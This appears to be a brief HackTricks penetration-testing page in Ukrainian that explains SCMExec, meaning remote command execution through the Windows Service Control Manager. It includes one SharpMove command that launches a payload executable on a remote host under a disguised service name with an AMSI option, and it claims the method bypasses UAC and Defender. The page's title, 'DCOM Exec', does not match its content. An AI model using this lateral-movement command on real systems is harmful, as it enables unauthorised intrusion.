# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** - це техніка виконання команд на віддалених системах за допомогою Менеджера керування службами (SCM) для створення служби, яка виконує команду. Цей метод може обійти деякі засоби безпеки, такі як Контроль облікових записів користувачів (UAC) та Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
